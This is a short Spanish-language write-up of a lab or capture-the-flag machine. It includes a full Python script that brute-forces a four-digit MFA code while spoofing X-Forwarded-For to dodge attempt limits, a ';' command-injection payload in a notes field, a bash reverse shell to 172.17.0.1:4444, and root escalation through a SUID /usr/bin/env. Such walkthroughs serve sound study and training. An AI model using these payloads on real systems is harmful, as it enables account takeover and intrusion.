## Reconocimiento:

Puerto 8000 : HTTP

En la web solo hay para iniciar o registrarte, lo hago y salta un panel donde te pide que introduzcas un código que mandaron a tu correo ( El cual no existe ). Decido crear un script en Python para hacerle fuerza bruta al posible código:

```python
#!/usr/bin/env python3

import requests
import argparse
import random
from termcolor import colored

def get_arguments():
    parser = argparse.ArgumentParser(description='BruteForce MFA Code')
    parser.add_argument('-d', '--dni', required=True, dest='dni', help='User DNI')
    parser.add_argument('-p', '--password', required=True, dest='password', help='User Password')
    parser.add_argument('-sid', '--session-password', required=True, dest='session_id', help='Session ID User')
    
    arguments = parser.parse_args()
    return arguments

def bruteforce(dni, password, session_id):
    main_url = "http://172.17.0.2:8000/verify-mfa"

    for i in range(0, 9999):
        codigo = f"{i:04}"
        data = {
            "dni": dni,
            "password": password,
            "pin": int(codigo)
        }

        cookies = {
            "session_id": session_id
        }

        headers = {
            "X-Forwarded-For": codigo
        }

        r = requests.post(main_url, cookies=cookies, data=data, headers=headers)

        if not "Intentos restantes" in r.text:
            print(colored(f"[+] Codigo encontrado: {codigo}", "green"))
            print(colored("[+] Cookie autenticada, http://172.17.0.2:8000/dashboard/", "blue"))
            break

def main():
    arguments = get_arguments()
    bruteforce(arguments.dni, arguments.password, arguments.session_id)

if __name__ == '__main__':
    main()
```

Luego lo ejecuto:

```bash
python3 bruteforce_mfa_code.py -d <dni> -p <user_password> -sid <session_id>
```

Dentro encuentro una barra para insertar una nota, la cual es vulnerable a un RCE ya que ejecuta comandos con caracteres concatenados ( En este caso “;” ).

```bash
; whoami
# Info: 
baluton
```

Confirmando así que puedo enviarme una shell:

Desde el host me pongo a  la escucha:

```bash
nc -nlvp 4444
```

Y ejecuto desde la web:

```bash
;echo ‘bash -c “bash -i >& /dev/tcp/172.17.0.1/4444 0>&1”’ | bash
```

## Escalada

```bash
find / -perm -4000 2>/dev/null
# Info:
/usr/bin/env
```

Gracias GTFO bins:

```bash
usr/bin/env /bin/bash -p
```

Listo.
